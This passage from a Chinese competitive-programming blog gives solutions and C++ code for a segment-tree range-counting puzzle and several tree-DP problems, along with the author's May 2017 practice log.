<p>人类被蚂蚁们逼到了 Greed Island 上的一个海湾。现在，小 孟晗 的后方是一望无际的大海， 前方是变异了的超 级蚂蚁。 小 孟晗 还有大好前程，他可不想命丧于此， 于是他派遣手下最后一批改造 SCV 布置地雷以阻挡蚂蚁们的进攻。 小 孟晗 最后一道防线是一条长度为 N 的战壕， 小 孟晗 拥有无数多种地雷，而 SCV 每次 可以在[ L , R ]区间埋放同一种不同于之前已经埋放的地雷。 由于情况已经十万火急，小 孟晗 在某些时候可能会询问你在[ L’ , R’] 区间内有多少种不同的地雷， 他希望你能尽快的给 予答复。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行为两个整数 n 和 m； n 表示防线长度， m 表示 SCV 布雷次数及小 孟晗 询问 的次数总和。 接下来有 m 行， 每行三个整数 Q，L , R； 若 Q=1 则表示 SCV 在[ L , R ]这段区间 布上一种地雷， 若 Q=2 则表示小 孟晗 询问当前[ L , R ]区间总共有多少种地雷。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>对于小 孟晗 的每次询问，输出一个答案（单独一行），表示当前区间地雷总数。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题，怎么说呢，超级恶心超级恶心！！！</p>
<p>不过学到了一招，正难则反，还有另一个在上一题学到的线段覆盖贪心定理。</p>
<p>刚刚开始的时候，我的策略就是如果一个区间里面和要放地雷的区间有交集，那么就让他们的数量+1，然后发现在搜索最大值的时候有些区间是分开的，也就是说没有办法一下子得到最大值，需要进行分区间，而分开的区间没有办法得出真正的地雷数，以为无论是取最大值还是求和都没有办法计算出来地雷数量。</p>
<p>然后我看到了题解里面的一句话，正难则反，百度了之后才明白，若果正着不好求出来这个值的时候，那么就可以尝试进行倒推，反着进行计算。</p>
<p>既然我们需要求出来这个区间里面的，和区间相交的线段的条数之和（将布置上一排地雷视为一个线段），那么我们只要求出有多少个线段没有和当前查询区间相交就可以了，如果没有和当前区间相交，那么我们就可以在区间左边找到线段右端的数量，在区间右边找到线段左端的数量，两个之和就是没有和区间相交的数量，这样就求出来了最终答案。</p>
<p>还有一个线段覆盖贪心定理，策略就是将线段右端点进行升序排序，如果右端点相同则左端点降序排序，然后排在前面的优先度高（似乎是通用类型）</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,x,y,z,Num_Right[<span class="number">400000</span>];</span><br><span class="line"><span class="keyword">int</span> ans,all,Num_Left[<span class="number">400000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>;<span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>) ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;This=This*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;ch=getchar();&#125;</span><br><span class="line">    <span class="keyword">return</span> This;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;y||Right&lt;x) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;x&amp;&amp;Right&lt;y) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>((Left==x&amp;&amp;Right==x)||(Left==y&amp;&amp;Right==y))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Left==x&amp;&amp;Right==x)</span><br><span class="line">        Num_Left[Root]++;</span><br><span class="line">        <span class="keyword">if</span>(Left==y&amp;&amp;Right==y)</span><br><span class="line">        Num_Right[Root]++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    Change(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    Change(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    Num_Left[Root]=Num_Left[Root*<span class="number">2</span>]+Num_Left[Root*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">    Num_Right[Root]=Num_Right[Root*<span class="number">2</span>]+Num_Right[Root*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search_Right</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;y||Right&lt;x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;=x&amp;&amp;Right&lt;=y) <span class="keyword">return</span> Num_Left[Root];</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> First=Search_Right(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> Second=Search_Right(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> First+Second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search_Left</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;y||Right&lt;x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;=x&amp;&amp;Right&lt;=y) <span class="keyword">return</span> Num_Right[Root];</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> First=Search_Left(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> Second=Search_Left(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> First+Second;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        z=In(); x=In(); y=In();</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">1</span>)</span><br><span class="line">        &#123; Change(<span class="number">1</span>,n,<span class="number">1</span>); all++; &#125;</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> First=x,Second=y;</span><br><span class="line">            x=<span class="number">1</span>;y=First<span class="number">-1</span>;</span><br><span class="line">            ans=Search_Left(<span class="number">1</span>,n,<span class="number">1</span>);</span><br><span class="line">            x=Second+<span class="number">1</span>;y=n;</span><br><span class="line">            ans+=Search_Right(<span class="number">1</span>,n,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;all-ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>线段树</tag>
      </tags>
  </entry>
  <entry>
    <title>May刷题柱</title>
    <url>/2017/05/20/7e9d5f193955/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>少年你已经落后于别人不少了，如果你还想冲击NOI的话，赶快去刷题，不要浮躁，用自己的努力来证明自己！</p>
</blockquote>
<h1 id="刷题柱"><a href="#刷题柱" class="headerlink" title="刷题柱"></a>刷题柱</h1><p>感觉自己完全太弱了啊，还是守着文化课吧，冲击省队毕尽只是梦想，转段考试结束就滚回去学文化课吧，停课还是不敢想了，毕竟进队概率太小，并且文化课太烂。OI最后去一下省选，如果靠着骗分暴力能够水进省队（毕竟HAOI）那么我就在全国赛上拼一把，争取搞一个铜牌签到浙大的一本线。如果没有进队，就体验一把APOI/CTSC彻底退役吧!纵然希望渺茫，也要做一条有梦想的咸鱼。</p>
<p>May/1   一道题：P1305；</p>
<p>May/2   一道题：P1301；</p>
<p>May/3   一道题：P1306；</p>
<p>May/4   一道题：P1512；</p>
<p>May/5   一道题：P1308；</p>
<p>May/6   休息；</p>
<p>May/7   休息；</p>
<p>May/8   三道题：P1308，P1243，P1244；</p>
<p>May/9   三道题：P1245；P1246；P1247；</p>
<p>May/10  两道题：P1227，P1241；</p>
<p>May/11  三道题：P1984，P1985，P1356；</p>
<p>May/12  四道题：P1455，P1822，P1357，P1358；</p>
<p>May/13  两道题：P1994，P1993；</p>
<p>May/14  两道题：P1658，P1917；</p>
<p>May/15  五道题：P1961，P1956，P1971，P1927，P1974；（水题）</p>
<p>May/16  五道题：P1905，P1923，P1962，P1906，P1925；（水题）</p>
<p>May/17  三道题：P1972，P1960，P1974，</p>
<p>May/18  搭建个人博客</p>
<p>May/19  搭建个人博客</p>
<p>May/20  搭建个人博客</p>
<p>May/21  转移博客内容</p>
<p>May/22  转移博客内容</p>
<p>May/23  三道题：P1822，P1322，P1730；</p>
<p>May/24  两道题：P1323，P1321；</p>
<p>May/25  三道题：P1319，P1318，P1324；</p>
<p>May/26  两道题：P1320，P1609;</p>
<p>May/27  两道题：P1140，P1341；</p>
<p>May/28  两道题：P1670，P1342；</p>
<p>May/29  一道题：P1671；</p>
<p>May/30  一道题：P1343；（放假）</p>
<p>May/31  两道题：P1111，P1344；（转段考试）</p>
<p>五月一共51道题，如果不搞博客的话再AC10道题是绰绰有余的，不过有一个自己的个人博客也是美滋滋，代价是值得的！</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>刷题柱</tag>
      </tags>
  </entry>
  <entry>
    <title>树形DP(2)</title>
    <url>/2017/05/20/7d0ec081edd4/</url>
    <content><![CDATA[<h1 id="P1305选课"><a href="#P1305选课" class="headerlink" title="P1305选课"></a>P1305选课</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>学校实行学分制。每门的必修课都有固定的学分，同时还必须获得相应的选修课程学分。学校开设了N（N&lt;300）门的选修课程，每个学生可选课程的数量M是给定的。学生选修了这M门课并考核通过就能获得相应的学分。你的任务是为自己确定一个选课方案，使得你能得到的学分最多，并且必须满足先修课优先的原则。假定课程之间不存在时间上的冲突。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入文件的第一行包括两个整数N、M（中间用一个空格隔开），其中1≤N≤300,1≤M≤N。 以下N行每行代表一门课。课号依次为1，2，…，N。每行有两个数（用一个空格隔开），第一个数为这门课先修课的课号（若不存在先修课则该项为0），第二个数为这门课的学分。学分是不超过10的正整数。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><ol>
<li>第一行：只有一个数：实际所选课程的学分总数。<br></li>
<li>下面m行：从下到大所选择的课程。</li>
</ol>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题相对于上一道题不过是多了一种选择的方案输出而已，我们在转化为二叉树的基础上，愉快的再次建立一个bool数组 <code>ans[i]</code> 来表示这个点 i 是否被选中，然后再次一个DFS递归，如果当前的 <code>f[x][y]==f[Borther[x]][y]</code> 那么我们就继续递归 <code>DFS(Brother[x],y)</code> 就行，当前这个点x完全可以扔掉了！如果当前的 <code>if(f[x][y]==f[Brother[x]][i-1]+f[Child[x]][y-i]+Value[x])</code> ，那么我们就可以判定，当前点x一定是被选中的，然后分别对两个分支进行DFS，一个是儿子，一个是兄弟，然后就可以return了。</p>
<p>记f[x][j]表示以点x为根，选择j个黑点，对答案的最大贡献<br>为什么是说“对答案的最大贡献呢”？首先我们是从x的子节点y转移过来，那么主要是想到一点，即分别考虑每条边x→y对答案的贡献，也就是“边一侧的黑点数 × 另一侧的黑点数 × 边的长度 + 边一侧的白点数 × 另一侧的白点数 × 边的长度”<br>我们记sze[x]表示以x为根的子树大小，边x→y对答案的贡献为valx→y，则状态转移方程为：<br>f[x][j]=Max(f[x][j−k]+f[y][k]+valx→y)<br>=Max(f[x][j−k]+f[y][k]+k×(j−k)×lenx→y+(sze[y]−k)×(n−m−sze[y]+k)×lenx→y)<br>看起来我们要枚举x→y,k,j，复杂度为O(n3)，实际上我们会发现枚举的范围为0≤k≤sze[y],0≤j−k≤sze[x]−sze[y]，那么总的枚举次数就为∑(sze[x]−sze[y])×sze[y]，我们不妨把其看作每次在以某一点x为根的子树上任选两个点a,b，使得a,b的最近公共祖先为x的方案数，因此实际复杂度为O(n2)</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,Value[<span class="number">600</span>],Brother[<span class="number">600</span>],x;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">600</span>][<span class="number">600</span>],Child[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">bool</span> ans[<span class="number">600</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(f[x][y]&gt;=<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>||y==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f[x][y]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(Brother[x],y);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;y;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DFS(Brother[x],i);</span><br><span class="line">        DFS(Child[x],y-i<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">int</span> This=max(f[Brother[x]][y],f[x][y]);</span><br><span class="line">        f[x][y]=max(This,f[Brother[x]][i]+f[Child[x]][y-i<span class="number">-1</span>]+Value[x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">0</span>||y==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(f[x][y]==f[Brother[x]][y])</span><br><span class="line">    Find(Brother[x],y);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=y;i++)</span><br><span class="line">    <span class="keyword">if</span>(f[x][y]==f[Brother[x]][i<span class="number">-1</span>]+f[Child[x]][y-i]+Value[x])</span><br><span class="line">    &#123;</span><br><span class="line">        Find(Brother[x],i<span class="number">-1</span>);</span><br><span class="line">        Find(Child[x],y-i);</span><br><span class="line">        ans[x]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">-1</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0</span>,<span class="keyword">sizeof</span>(ans));</span><br><span class="line">    <span class="built_in">memset</span>(Child,<span class="number">0</span>,<span class="keyword">sizeof</span>(Child));</span><br><span class="line">    <span class="built_in">memset</span>(Brother,<span class="number">0</span>,<span class="keyword">sizeof</span>(Brother));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;Value[i];</span><br><span class="line">        Brother[i]=Child[x];</span><br><span class="line">        Child[x]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    DFS(Child[<span class="number">0</span>],m);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[Child[<span class="number">0</span>]][m]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    Find(Child[<span class="number">0</span>],m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(ans[i]) <span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1306河流"><a href="#P1306河流" class="headerlink" title="P1306河流"></a>P1306河流</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>几乎整个Byteland 王国都被森林和河流所覆盖。小点的河汇聚到一起，形成了稍大点的河。就这样，所有的河水都汇聚并流进了一条大河，最后这条大河流进了大海。这条大河的入海口处有一个村庄——Bytetown。</p>
</blockquote>
<ul>
<li>在Byteland国，有n个伐木的村庄，这些村庄都座落在河边。目前在Bytetown，有一个巨大的伐木场，它处理着全国砍下的所有木料。木料被砍下后，顺着河流而被运到Bytetown的伐木场。Byteland 的国王决定，为了减少运输木料的费用，再额外地建造k个伐木场。这k个伐木场将被建在其他村庄里。这些伐木场建造后，木料就不用都被送到Bytetown了，它们可以在 运输过程中第一个碰到的新伐木场被处理。显然，如果伐木场座落的那个村子就不用再付运送木料的费用了。它们可以直接被本村的伐木场处理。 注：所有的河流都不会分叉，形成一棵树，根结点是Bytetown。</li>
</ul>
<p>国王的大臣计算出了每个村子每年要产多少木料，你的任务是决定在哪些村子建设伐木场能获得最小的运费。其中运费的计算方法为：每一吨木料每千米1分钱。</p>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行包括两个数n（2&lt;=n&lt;=100），k（1&lt;=k&lt;=50,且k&lt;=n）。n为村庄数，k为要建的伐木场的数目。除了Bytetown 外，每个村子依次被命名为 1，2，3……n，Bytetown被命名为0。</li>
<li>接下来n行，每行3个整数： wi——每年 i 村子产的木料的块数。（0&lt;=wi&lt;=10000）vi——离 i 村子下游最近的村子。（即 i 村子的父结点）（0&lt;=vi&lt;=n）di——vi 到 i 的距离(千米)。（1&lt;=di&lt;=10000)</li>
<li>保证每年所有的木料流到bytetown 的运费不超过2000,000,000分.50％的数据中n不超过20。</li>
</ol>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>一行，最小的运费。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>拿到这道题，其实我是想了好久的，尝试了各种各种DP的方法，但是一直GG，后来我突然想到了上一道题所用到的多叉树转二叉树的方法，然后用DFS遍历所有的点就可以了，最开始的时候我设置的状态 <code>f[i][j][k]</code> 表示的是对于当前节点i，一共使用j个工厂，然后k表示true或者false表示是否在当前进行建立工厂的最优值。但是发现又不行，因为距离是没有办法进行记录的，也就是说，这样的话记录下来没有办法确定木头的运输距离，也就是不知道距离它最近的工厂的位置，那么我们就更改一下状态的设置，我们表示出来 <code>f[i][j][k]</code> 表示的是对于第i个点，距离他最近有工厂的点为j，其中选择建造了k个工厂。然后在DFS传参数的时候加上距离dis一项，然后我们就可以进行愉快的计算了。</p>
<p>然后对于一个点x，我们有两种选择方法，也就是第一种，自己建造工厂和自己用别人的工厂，那么我们就进行两次DP，然后在其中求出最优值，如果不在这里进行建造工厂的话枚举i从0到k，表示自己的儿子负担i个，然后兄弟们负担 <code>k-i</code> 个。</p>
<p>第二种，如果自己亲自进行建造工厂，那么枚举i从0到k-1，然后表示自己的孩子一共建造i个，然后自己的兄弟们负责建造 <code>k-i-1</code> 个（减去的1表示点x已经建造了一个工厂）</p>
<p>以后看到题想不清楚了，然后仔细推一推看看自己的状态设置是不是少了什么，是不是有些是没有用的，可以用更加强大的进行代替掉，然后就是参数的传递上需要进行传递什么，也要仔细考虑清楚的！</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,Child[<span class="number">200</span>],Brother[<span class="number">200</span>],len=<span class="number">0</span>,x,Get;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">200</span>][<span class="number">200</span>][<span class="number">200</span>],Weight[<span class="number">200</span>],Distance[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> Root,<span class="keyword">int</span> k,<span class="keyword">int</span> dis)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x==<span class="number">-1</span>||Root==<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(f[x][Root][k]!=Get) <span class="keyword">return</span> f[x][Root][k];</span><br><span class="line">    <span class="keyword">int</span> LHH=f[x][Root][k];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=k;i++) <span class="comment">//如果不去建造伐木场</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> First=DFS(Child[x],Root,i,dis+Distance[x]);</span><br><span class="line">        <span class="keyword">int</span> Second=DFS(Brother[x],Root,k-i,dis);</span><br><span class="line">        <span class="keyword">int</span> Value=(dis+Distance[x])*Weight[x];</span><br><span class="line">        LHH=min(LHH,First+Second+Value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++) <span class="comment">//如果选择建造伐木场</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> First=DFS(Child[x],x,i,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> Second=DFS(Brother[x],Root,k-i<span class="number">-1</span>,dis);</span><br><span class="line">        LHH=min(LHH,First+Second);</span><br><span class="line">    &#125;</span><br><span class="line">    f[x][Root][k]=LHH;</span><br><span class="line">    <span class="keyword">return</span> f[x][Root][k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Child,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Child));</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">    <span class="built_in">memset</span>(Brother,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Brother));</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">120</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    Get=f[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;Weight[i]&gt;&gt;x&gt;&gt;Distance[i];</span><br><span class="line">        Brother[i]=Child[x];</span><br><span class="line">        Child[x]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;DFS(<span class="number">0</span>,<span class="number">0</span>,m,<span class="number">0</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1512软件安装"><a href="#P1512软件安装" class="headerlink" title="P1512软件安装"></a>P1512软件安装</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><ul>
<li>现在我们的手头有N个软件，对于一个软件i，它要占用Wi的磁盘空间，它的价值为Vi。我们希望从中选择一些软件安装到一台磁盘容量为M的计算机上，使得这些软件的价值尽可能大（即Vi的和最大）。</li>
<li>但是现在有个问题：软件之间存在依赖关系，即软件i只有在安装了软件j（包括软件j的直接或间接依赖）的情况下才能<strong>正确工作</strong>（软件吗i<strong>依赖</strong>软件j）。幸运的是，一个软件最多依赖另外一个软件。如果一个软件不能正常工作，那么他能够发挥的作用为0。</li>
<li>我们现在知道了软件之间的依赖关系：软件i依赖Di。现在请你设计出一种方案，安装价值尽量大的软件。一个软件只能被<strong>安装一次</strong>，如果一个软件没有依赖则Di=0，这是只要这个软件安装了，它就能正常工作。</li>
</ul>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入:"></a>输入:</h2><ol>
<li>第1行：N,M （0&lt;=N&lt;=100,0&lt;=M&lt;=500） <br></li>
<li>第2行：W1,W2, … Wi, … ,Wn <br></li>
<li>第3行：V1,V2, … Vi, … ,Vn <br></li>
<li>第4行：D1,D2, … Di, … ,Dn</li>
</ol>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>一个整数，代表最大价值。</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><p>这道题也是非常神奇的，一开始我是忽略掉了可能会出现环的情况，然后就开心的当成了选课，多叉转二叉，DFS直接开始深搜……然后就只拿到了40分（省选题暴力搞到40分也是蛮不错的）</p>
<p>然后仔细想了想，发现的确可能出现环的情况，在左右思索无助的时候还是忍不住的看了题解QAQ，然后就来总结一发。</p>
<p>这道题的其实可以通过题目上的一个条件很清楚的看出来，因为题目上已经说过了，如果没有安装他的依赖软件，那么这个软件也是可以安装的，但是权值为0，所以这里就决定了这个图并不是寻常的树规……</p>
